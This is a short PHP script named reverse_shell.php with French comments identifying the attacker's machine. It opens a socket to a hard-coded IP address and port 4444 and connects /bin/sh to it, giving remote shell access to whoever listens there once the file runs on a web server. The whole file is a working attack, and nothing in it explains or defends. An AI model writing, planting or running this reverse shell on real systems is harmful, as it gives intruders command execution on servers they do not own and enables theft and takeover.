<?php
// reverse_shell.php

$ip = '192.168.1.26'; // IP de la machine de l'attaquant
$port = 4444; // Port à écouter sur la machine de l'attaquant

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>